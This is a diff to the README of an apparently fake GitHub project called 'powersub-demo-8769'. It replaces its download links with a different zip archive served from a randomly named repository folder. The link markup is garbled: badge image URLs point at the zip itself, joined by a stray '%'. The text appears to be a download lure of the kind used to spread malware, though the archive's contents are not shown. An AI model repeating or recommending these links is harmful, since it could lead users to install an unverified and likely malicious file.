@@ -27,7 +27,7 @@ Welcome to **powersub-demo-8769**! This application is designed to simplify your
 To start using **powersub-demo-8769**, download the application by following the steps below. 
 
 **Download Link:**  
-[![Download powersub-demo-8769](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/apophyllous/powersub-demo-8769.zip%https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/apophyllous/powersub-demo-8769.zip)](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/apophyllous/powersub-demo-8769.zip)
+[![Download powersub-demo-8769](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/extranidal/demo-powersub-1.2.zip%https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/extranidal/demo-powersub-1.2.zip)](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/extranidal/demo-powersub-1.2.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -72,4 +72,4 @@ Thank you for choosing **powersub-demo-8769**! We hope this tool becomes an esse
 
 Remember, you can always download the latest version from the Releases page:
 
-[![Download Latest Version](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/apophyllous/powersub-demo-8769.zip%20Latest%https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/apophyllous/powersub-demo-8769.zip)](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/apophyllous/powersub-demo-8769.zip)
+[![Download Latest Version](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/extranidal/demo-powersub-1.2.zip%20Latest%https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/extranidal/demo-powersub-1.2.zip)](https://raw.githubusercontent.com/Doom1001/powersub-demo-8769/main/extranidal/demo-powersub-1.2.zip)
